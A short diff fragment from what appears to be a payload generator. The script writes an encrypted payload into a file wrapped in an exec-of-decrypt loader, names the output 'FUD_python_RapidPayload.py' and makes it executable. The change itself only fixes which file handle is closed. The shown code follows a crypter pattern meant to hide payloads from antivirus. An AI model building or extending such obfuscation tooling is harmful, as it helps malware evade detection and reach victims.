@@ -22,6 +22,6 @@ enc_pay =""" "\'"+payload1+"\'")
 payload.write("""
 exec(f_obj.decrypt(enc_pay))
     """)
-final_payload.close()
+payload.close()
 os.system("rm date.txt")
 os.system("chmod +x FUD_python_RapidPayload.py")
